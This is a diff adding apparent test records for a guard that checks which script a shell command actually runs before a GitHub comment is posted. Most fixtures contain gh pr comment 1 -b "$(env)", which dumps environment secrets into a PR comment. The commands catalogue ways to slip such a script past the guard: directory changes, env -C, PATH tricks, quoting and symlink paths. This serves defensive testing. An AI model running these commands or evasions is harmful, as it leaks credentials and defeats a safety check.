@@ -1,0 +1,725 @@
+# Frozen pre-merge evaluation records of PR 845 (CRW-875, heads 0ec90889 1bf60d75 3cccb50b 3e2d3c04 705d4e3f 92799ae0 c343611d
+# ef89e0ed f30490c1). The GitHub post guard reads the script file a shell runs, in the directory the shell runs in. The files
+# of a row exist under the working directory (and the checkout); a script that posts holds gh pr comment 1 -b "$(env)".
+
+=== PR845-0ec90889-d2 | Q
+--why cd sub: the shell runs sub/post.sh, the posting file, not the clean file in the working directory.
+--file post.sh
+echo ok
+--file sub/post.sh
+gh pr comment 1 -b "$(env)"
+--cmd
+cd sub && bash post.sh
+
+=== PR845-0ec90889-d2b | U
+--why env -C sub moves the shell to sub before it runs the script. env -C is not modelled: the reader refuses it, which denies as the finding asks.
+--file post.sh
+echo ok
+--file sub/post.sh
+gh pr comment 1 -b "$(env)"
+--cmd
+env -C sub bash post.sh
+
+=== PR845-0ec90889-d2c | U
+--why The same command writes the file it then runs (cp over post.sh): the file read before the command is not the file that runs.
+--file post.sh
+echo ok
+--file evil.sh
+gh pr comment 1 -b "$(env)"
+--cmd
+cp evil.sh post.sh && bash post.sh
+
+=== PR845-0ec90889-d3 | Q
+--why "post's.sh" is the file post's.sh; the file post is a harmless decoy.
+--file post
+echo ok
+--file post's.sh
+gh pr comment 1 -b "$(env)"
+--cmd
+bash "post's.sh"
+
+=== PR845-0ec90889-d3b | Q
+--why 'ba'sh is bash: the posting script runs.
+--file post.sh
+gh pr comment 1 -b "$(env)"
+--cmd
+true; 'ba'sh post.sh
+
+=== PR845-0ec90889-d3c | Q
+--why 'evil.sh)' is the file evil.sh) (the parenthesis is part of the name); evil.sh is a clean decoy.
+--file evil.sh
+echo ok
+--file evil.sh)
+gh pr comment 1 -b "$(env)"
+--cmd
+true; bash 'evil.sh)'
+
+=== PR845-0ec90889-d4 | U
+--why PATH is assigned before source: the file source finds is not the file in the working directory.
+--file lib.sh
+echo ok
+--cmd
+PATH=/tmp/post-bin:$PATH source lib.sh
+
+=== PR845-0ec90889-d5 | P
+--why gh api --input '-' posts standard input; a file literally named '-' (with quotes) is a decoy.
+--file '-'
+clean
+--cmd
+gh api repos/o/r/issues/1/comments --input '-'
+
+=== PR845-0ec90889-d6 | U
+--why zsh -oshwordsplit: the s inside the option name is no shell-option letter; zsh runs post.sh. The zsh option cluster is not modelled: refused.
+--file post.sh
+gh pr comment 1 -b "$(env)"
+--cmd
+zsh -oshwordsplit post.sh
+
+=== PR845-0ec90889-d6b | Q
+--why source +post.sh: the file name starts with a plus sign, which source takes as a file.
+--file +post.sh
+gh pr comment 1 -b "$(env)"
+--cmd
+source +post.sh
+
+=== PR845-1bf60d75-d2 | P
+--why command ./env runs the executable text script ./env in the working directory, which posts.
+--file env
+#!/bin/sh
+gh pr comment 1 -b "$(env)"
+--cmd
+command ./env
+
+=== PR845-1bf60d75-d2b | P
+--why env ./env runs the same executable text script.
+--file env
+#!/bin/sh
+gh pr comment 1 -b "$(env)"
+--cmd
+env ./env
+
+=== PR845-1bf60d75-d3 | P
+--why ./gh is an executable script in the working directory that posts, whatever its argument.
+--file gh
+#!/bin/sh
+gh pr comment 1 -b "$(env)"
+--cmd
+./gh pr view 1
+
+=== PR845-1bf60d75-d4 | U
+--why PATH assigned in the text decides which lib.sh source reads.
+--file lib.sh
+echo hi
+--cmd
+PATH=/tmp/crw-evil:/usr/bin:/bin source lib.sh
+
+=== PR845-1bf60d75-d4b | U
+--why The dot builtin with the same PATH.
+--file lib.sh
+echo hi
+--cmd
+PATH=/tmp/crw-evil:/usr/bin:/bin . lib.sh
+
+=== PR845-1bf60d75-d5 | Q
+--why (cd sub) ends in a subshell; bash then runs post.sh of the original directory, which posts.
+--file post.sh
+gh pr comment 1 -b "$(env)"
+--file sub/post.sh
+echo hi
+--cmd
+(cd sub); bash post.sh
+
+=== PR845-1bf60d75-d6 | U
+--why env -C sub moves to sub, whose post.sh posts; the clean post.sh of the working directory is not the file that runs. env -C is not modelled: the reader refuses it, which denies as the finding asks.
+--file post.sh
+echo hi
+--file sub/post.sh
+gh pr comment 1 -b "$(env)"
+--cmd
+env -C sub bash post.sh
+
+=== PR845-1bf60d75-d6b | U
+--why env --chdir=sub is the long form. env -C is not modelled: the reader refuses it, which denies as the finding asks.
+--file post.sh
+echo hi
+--file sub/post.sh
+gh pr comment 1 -b "$(env)"
+--cmd
+env --chdir=sub bash post.sh
+
+=== PR845-3cccb50b-d1 | U
+--why A cd in a branch that may not run leaves the directory unknown: the reader cannot say which post.sh runs.
+--file post.sh
+gh pr comment 1 -b "$(env)"
+--file sub/post.sh
+echo clean
+--cmd
+if false; then cd sub; fi; bash post.sh
+
+=== PR845-3cccb50b-d1b | U
+--why A cd in a loop that may not run.
+--file post.sh
+gh pr comment 1 -b "$(env)"
+--file sub/post.sh
+echo clean
+--cmd
+while false; do cd sub; done; bash post.sh
+
+=== PR845-3cccb50b-d2 | Q
+--why 2>/dev/null before the shell is a redirect, not the program.
+--file post.sh
+gh pr comment 1 -b "$(env)"
+--cmd
+2>/dev/null bash post.sh
+
+=== PR845-3cccb50b-d2b | Q
+--why A redirect between the shell and its script; a clean file named 2 is a decoy.
+--file post.sh
+gh pr comment 1 -b "$(env)"
+--file 2
+echo clean
+--cmd
+bash 2>/dev/null post.sh
+
+=== PR845-3cccb50b-d3 | U
+--why $DIR is set outside the text: the directory env -C moves to is unknown.
+--file post.sh
+echo clean
+--cmd
+env -C "$DIR" bash post.sh
+
+=== PR845-3cccb50b-d3b | U
+--why The long option form with an unknown directory.
+--file post.sh
+echo clean
+--cmd
+env --chdir="$DIR" bash post.sh
+
+=== PR845-3cccb50b-d4 | U
+--why cd with no operand goes to HOME, which the reader does not know.
+--file post.sh
+echo clean
+--cmd
+cd; bash post.sh
+
+=== PR845-3cccb50b-d4b | U
+--why cd - goes to OLDPWD, which the reader does not know.
+--file post.sh
+echo clean
+--cmd
+cd -; bash post.sh
+
+=== PR845-3cccb50b-d5 | Q
+--why bash post.sh\) names the file post.sh) (the backslash escapes the parenthesis).
+--file post.sh)
+gh pr comment 1 -b "$(env)"
+--file post.sh\
+echo clean
+--cmd
+bash post.sh\)
+
+=== PR845-3cccb50b-d5b | Q
+--why A backslash-newline inside the word joins po and st.sh into post.sh.
+--file post.sh
+gh pr comment 1 -b "$(env)"
+--cmd
+bash po\
+st.sh
+
+=== PR845-3cccb50b-d6 | T
+--why Control: a script that holds the words issue and make on separate lines posts nothing.
+--file build.sh
+echo issue
+make
+--cmd
+bash build.sh
+
+=== PR845-3cccb50b-d7 | B
+--why Control: cd to an unknown directory followed by an ordinary orchestrator command.
+cd "$PWD" && make
+
+=== PR845-3cccb50b-d7b | B
+--why Control: cd to an unknown directory followed by ls.
+cd "$DIR" && ls
+
+=== PR845-3e2d3c04-d1 | Q
+--why The shell runs the file named post.sh extra; the file post.sh\ is a clean decoy.
+--file post.sh\
+echo clean
+--file post.sh extra
+gh pr comment 1 -b "$(env)"
+--cmd
+bash post.sh\ extra
+
+=== PR845-3e2d3c04-d2 | Q
+--why post.sh>out is the script post.sh with stdout redirected to out; the file post.sh>out is a clean decoy.
+--file post.sh
+gh pr comment 1 -b "$(env)"
+--file post.sh>out
+echo clean
+--cmd
+bash post.sh>out
+
+=== PR845-3e2d3c04-d2b | Q
+--why >out before the shell is a redirect; the program is bash.
+--file post.sh
+gh pr comment 1 -b "$(env)"
+--cmd
+>out bash post.sh
+
+=== PR845-3e2d3c04-d3 | U
+--why env -C sub -S 'bash post.sh' runs sub/post.sh. env -C is not modelled: the reader refuses it, which denies as the finding asks.
+--file post.sh
+echo clean
+--file sub/post.sh
+gh pr comment 1 -b "$(env)"
+--cmd
+env -C sub -S 'bash post.sh'
+
+=== PR845-3e2d3c04-d3b | U
+--why The same after a list operator. env -C is not modelled: the reader refuses it, which denies as the finding asks.
+--file post.sh
+echo clean
+--file sub/post.sh
+gh pr comment 1 -b "$(env)"
+--cmd
+true; env -C sub -S 'bash post.sh'
+
+=== PR845-3e2d3c04-d4 | U
+--why PATH is assigned by a statement after a list operator, then source searches it.
+--file lib.sh
+echo clean
+--cmd
+true && PATH=/tmp/evil:/usr/bin:/bin; source lib.sh
+
+=== PR845-3e2d3c04-d4b | U
+--why PATH assigned as a prefix of true only; the reader refuses any PATH assignment.
+--file lib.sh
+echo clean
+--cmd
+PATH=/tmp/clean true; source lib.sh
+
+=== PR845-3e2d3c04-d5 | U
+--why Six conditional cd statements leave the directory unknown; the reader must not keep a truncated set of states.
+--file post.sh
+gh pr comment 1 -b "$(env)"
+--file f/post.sh
+echo clean
+--cmd
+false && cd a; false && cd b; false && cd c; false && cd d; false && cd e; false && cd f; bash post.sh
+
+=== PR845-3e2d3c04-d6 | T
+--why Control: 'cash$.sh' is a literal file name in single quotes; nothing expands.
+--file cash$.sh
+echo hi
+--cmd
+bash 'cash$.sh'
+
+=== PR845-3e2d3c04-d7 | P
+--why ./gh with no such file: the program cannot be read, the guard refuses.
+./gh pr view 1
+
+=== PR845-705d4e3f-d1 | Q
+--why 'ba'sh is bash.
+--file post.sh
+gh pr comment 1 -b "$(env)"
+--cmd
+true; 'ba'sh post.sh
+
+=== PR845-705d4e3f-d2 | Q
+--why cd sub && bash post.sh runs sub/post.sh.
+--file post.sh
+echo clean
+--file sub/post.sh
+gh pr comment 1 -b "$(env)"
+--cmd
+cd sub && bash post.sh
+
+=== PR845-705d4e3f-d2b | U
+--why PATH is assigned for the dot builtin.
+--file lib.sh
+echo clean
+--cmd
+PATH=/tmp/evil . lib.sh
+
+=== PR845-705d4e3f-d3 | U
+--why ./sh is an executable script in the working directory, not the shell. ./sh is a shell with no operand: it reads standard input, which is unreadable.
+--file sh
+#!/bin/sh
+gh pr comment 1 -b "$(env)"
+--cmd
+./sh
+
+=== PR845-705d4e3f-d3b | P
+--why ./env is an executable script.
+--file env
+#!/bin/sh
+gh pr comment 1 -b "$(env)"
+--cmd
+./env
+
+=== PR845-705d4e3f-d3c | P
+--why ./gh help runs the script ./gh whatever the argument.
+--file gh
+#!/bin/sh
+gh pr comment 1 -b "$(env)"
+--cmd
+./gh help
+
+=== PR845-92799ae0-d1 | U
+--why true && cd sub: the directory after the list is uncertain to the reader.
+--file post.sh
+echo clean
+--file sub/post.sh
+gh pr comment 1 -b "$(env)"
+--cmd
+true && cd sub; bash post.sh
+
+=== PR845-92799ae0-d1b | U
+--why false || cd sub.
+--file post.sh
+echo clean
+--file sub/post.sh
+gh pr comment 1 -b "$(env)"
+--cmd
+false || cd sub; bash post.sh
+
+=== PR845-92799ae0-d2 | T | deviation=attempt/deny/deny
+--why env -C sub true: the directory change belongs to true only; bash runs the clean post.sh of the working directory. The finding asks for an allow (dev allowed it); the reader refuses env -C, an accepted over-refusal.
+--file post.sh
+echo clean
+--file sub/post.sh
+gh pr comment 1 -b "$(env)"
+--cmd
+env -C sub true; bash post.sh
+
+=== PR845-92799ae0-d2b | U
+--why The files reversed: the working directory's post.sh posts. env -C is not modelled: the reader refuses it, which denies as the finding asks.
+--file post.sh
+gh pr comment 1 -b "$(env)"
+--file sub/post.sh
+echo clean
+--cmd
+env -C sub true; bash post.sh
+
+=== PR845-92799ae0-d3 | Q
+--why '>post.sh' quoted is a file name, not a redirect.
+--file >post.sh
+gh pr comment 1 -b "$(env)"
+--cmd
+bash '>post.sh' 2>/dev/null
+
+=== PR845-92799ae0-d4 | Q
+--why /usr/bin/env is the wrapper env.
+--file post.sh
+gh pr comment 1 -b "$(env)"
+--cmd
+/usr/bin/env bash post.sh
+
+=== PR845-92799ae0-d4b | Q
+--why /usr/bin/timeout is the wrapper timeout.
+--file post.sh
+gh pr comment 1 -b "$(env)"
+--cmd
+/usr/bin/timeout 30 bash post.sh
+
+=== PR845-92799ae0-d5 | Q
+--why A subshell that starts with a cd: the shell runs sub/post.sh.
+--file post.sh
+echo clean
+--file sub/post.sh
+gh pr comment 1 -b "$(env)"
+--cmd
+true; (cd sub; bash post.sh)
+
+=== PR845-92799ae0-d7 | U
+--why cd through a link and back: the logical parent differs from the physical one, so the reader cannot name the directory.
+--file post.sh
+gh pr comment 1 -b "$(env)"
+--file other/child/keep
+x
+--file other/post.sh
+echo clean
+--link link other/child
+--cmd
+cd link; cd ..; bash post.sh
+
+=== PR845-92799ae0-d8 | P
+--why ./gh with no such file.
+./gh pr view 1
+
+=== PR845-92799ae0-d9 | U
+--why "$SCRIPT" is set outside the text: the file is unknown, the file literally named $SCRIPT is a decoy.
+--file post.sh
+gh pr comment 1 -b "$(env)"
+--file $SCRIPT
+echo clean
+--cmd
+bash "$SCRIPT"
+
+=== PR845-c343611d-d1 | Q
+--why A quoted --body-file in a script line names a file with a secret.
+--file {TMP}/private.md
+GH_TOKEN=abc123456789
+--file post.sh
+gh pr comment 1 '--body-file' {TMP}/private.md
+--cmd
+bash post.sh
+
+=== PR845-c343611d-d1b | Q
+--why A quoted --body in a script line.
+--file post.sh
+gh pr comment 1 '--body' 'private text'
+--cmd
+bash post.sh
+
+=== PR845-c343611d-d2 | U
+--why false && cd sub: the directory is uncertain.
+--file post.sh
+gh pr comment 1 -b "$(env)"
+--file sub/post.sh
+echo clean
+--cmd
+false && cd sub; bash post.sh
+
+=== PR845-c343611d-d2b | Q
+--why cd sub | cat runs cd in a pipeline member; the directory stays.
+--file post.sh
+gh pr comment 1 -b "$(env)"
+--file sub/post.sh
+echo clean
+--cmd
+cd sub | cat; bash post.sh
+
+=== PR845-c343611d-d3 | Q
+--why '>post.sh' is a literal first operand.
+--file >post.sh
+gh pr comment 1 -b "$(env)"
+--cmd
+bash '>post.sh'
+
+=== PR845-c343611d-d4 | U
+--why PATH assigned by a statement; source follows it.
+--file lib.sh
+echo clean
+--cmd
+PATH=/tmp/evil:/usr/bin:/bin; source lib.sh
+
+=== PR845-c343611d-d4b | U
+--why The dot builtin.
+--file lib.sh
+echo clean
+--cmd
+PATH=/tmp/evil:/usr/bin:/bin; . lib.sh
+
+=== PR845-c343611d-d5 | U
+--why A PATH entry with a link followed by ..: the kernel follows the link before the parent step.
+--file lib.sh
+echo clean
+--cmd
+PATH=/tmp/t/decoy/link/..:/usr/bin:/bin source lib.sh
+
+=== PR845-c343611d-d6 | P
+--why An executable ./gh larger than 1 MiB cannot be read: refused.
+--file gh
+#!/bin/sh
+{PAD1M}
+gh pr comment 1 -b "$(env)"
+--cmd
+./gh pr view 1
+
+=== PR845-c343611d-d7 | Q
+--why wrapper.sh posts through the executable script ./gh with a clean body file: the inner script posts unchecked text.
+--file {TMP}/clean.md
+hello
+--file wrapper.sh
+./gh pr comment 1 --body-file {TMP}/clean.md
+--file gh
+#!/bin/sh
+gh pr comment 1 -b "$(env)"
+--cmd
+bash wrapper.sh
+
+=== PR845-c343611d-d7b | P
+--why The same wrapper run directly.
+--file {TMP}/clean.md
+hello
+--file wrapper.sh
+#!/bin/sh
+./gh pr comment 1 --body-file {TMP}/clean.md
+--file gh
+#!/bin/sh
+gh pr comment 1 -b "$(env)"
+--cmd
+./wrapper.sh
+
+=== PR845-ef89e0ed-d2 | P
+--why SCRIPT is a literal assignment of straight-line code, so ./"$SCRIPT" is ./post.sh, a script in the working directory that posts.
+--file post.sh
+#!/bin/sh
+gh pr comment 1 -b "$(env)"
+--file $SCRIPT
+echo clean
+--cmd
+SCRIPT=post.sh; ./"$SCRIPT"
+
+=== PR845-ef89e0ed-d3 | Q
+--why D=sub is a literal assignment of straight-line code, so cd "$D" is known and the shell runs sub/post.sh.
+--file post.sh
+echo clean
+--file sub/post.sh
+gh pr comment 1 -b "$(env)"
+--cmd
+D=sub; cd "$D"; bash post.sh
+
+=== PR845-ef89e0ed-d3b | U
+--why PATH is assigned from a variable; source searches it.
+--file lib.sh
+echo clean
+--cmd
+P=/evil; PATH="$P:/usr/bin:/bin"; source lib.sh
+
+=== PR845-ef89e0ed-d4 | U
+--why sudo -D changes the directory the script is run in; the option is not modelled.
+--file post.sh
+echo clean
+--file sub/post.sh
+gh pr comment 1 -b "$(env)"
+--cmd
+sudo -D sub bash post.sh
+
+=== PR845-ef89e0ed-d4b | U
+--why The attached form -Dsub.
+--file post.sh
+echo clean
+--file sub/post.sh
+gh pr comment 1 -b "$(env)"
+--cmd
+sudo -Dsub bash post.sh
+
+=== PR845-ef89e0ed-d5 | Q
+--why Inside double quotes a backslash before q stays: the file is post\q.sh; postq.sh is a clean decoy.
+--file postq.sh
+echo clean
+--file post\q.sh
+gh pr comment 1 -b "$(env)"
+--cmd
+bash "post\q.sh"
+
+=== PR845-ef89e0ed-d6 | Q
+--why The first line of the script is neither form A nor exception B: the script is refused though the second line is a clean post.
+--file {TMP}/b.md
+hello
+--file post.sh
+gh auth status
+gh pr comment 1 --body-file {TMP}/b.md
+--cmd
+bash post.sh
+
+=== PR845-ef89e0ed-d7 | P
+--why A quoted method token is POST; gh api --input - posts standard input.
+gh api repos/o/r/issues/1/comments -X 'POST' --input -
+
+=== PR845-ef89e0ed-d7b | P
+--why The long option with a quoted method and body=@-.
+gh api repos/o/r/issues/1/comments --method 'POST' --field body=@-
+
+=== PR845-f30490c1-d1 | U
+--why A cd inside a then-branch after another statement: the directory is uncertain.
+--file post.sh
+gh pr comment 1 -b "$(env)"
+--file sub/post.sh
+echo clean
+--cmd
+if false; then true; cd sub; fi; bash post.sh
+
+=== PR845-f30490c1-d1b | U
+--why A cd in a case branch that never matches.
+--file post.sh
+gh pr comment 1 -b "$(env)"
+--file sub/post.sh
+echo clean
+--cmd
+case x in never) cd sub;; esac; bash post.sh
+
+=== PR845-f30490c1-d2 | U
+--why After cd to an unknown variable directory a relative cd leaves it unknown.
+--file sub/post.sh
+echo clean
+--cmd
+D=/evil; cd "$D"; cd ./sub; bash post.sh
+
+=== PR845-f30490c1-d2b | U
+--why CDPATH assigned in the text makes the relative cd target unknown.
+--file safe/target/post.sh
+echo clean
+--cmd
+CDPATH=/evil; cd ./safe; cd target; bash post.sh
+
+=== PR845-f30490c1-d3 | Q
+--why env -S splits the string into words: the operand is the single file post.sh extra.
+--file post.sh
+echo clean
+--file post.sh extra
+gh pr comment 1 -b "$(env)"
+--cmd
+env -S bash 'post.sh extra'
+
+=== PR845-f30490c1-d4 | U
+--why declare -x PATH changes the search path of source.
+--file lib.sh
+echo clean
+--cmd
+declare -x PATH=/evil:/usr/bin:/bin; source lib.sh
+
+=== PR845-f30490c1-d5 | T
+--why Control: a relative cd to a known directory leaves it known and the clean script is allowed.
+--file sub/clean.sh
+echo clean
+--cmd
+cd ./sub; bash clean.sh
+
+=== PR845-f30490c1-d5b | T
+--why Control: an absolute cd.
+--file sub/clean.sh
+echo clean
+--cmd
+cd {WORK}/sub; bash clean.sh
+
+=== PR845-0ec90889-d1 | P
+--why Cleaned lexically the path is the clean body.md in the temporary root, but the kernel follows the link before the .. and reaches a file outside every trusted root: the body path is resolved through its links, not cleaned.
+--file {TMP}/body.md
+hello
+--link {TMP}/link /usr
+--cmd
+gh pr comment 1 --body-file {TMP}/link/../body.md
+
+=== PR845-1bf60d75-d1 | P
+--why The argv element is the file name 'body.md' with the quotes (shell text: a double-quoted word holding single quotes); the clean body.md is a decoy and the quoted-name file holds a token.
+--file {TMP}/body.md
+hello
+--file {TMP}/'body.md'
+GH_TOKEN=abc123456789
+--cmd
+gh pr comment 1 --body-file "{TMP}/'body.md'"
+
+=== PR845-ef89e0ed-d1 | Q
+--why The argv element is the single word post.sh extra (shell text: a quoted word); the clean post.sh is a decoy.
+--file post.sh
+echo clean
+--file post.sh extra
+gh pr comment 1 -b "$(env)"
+--cmd
+bash 'post.sh extra'
+
+=== CRW-1028-class5-script-dotdot | Q
+--why Failure class 5: bash opens link/../post.sh through the kernel, so .. steps up from the link's target (other/child) to other/post.sh, which posts; cleaning the path first would read the clean post.sh of the working directory.
+--file post.sh
+echo clean
+--file other/child/keep
+x
+--file other/post.sh
+gh pr comment 1 -b "$(env)"
+--link link other/child
+--cmd
+bash link/../post.sh
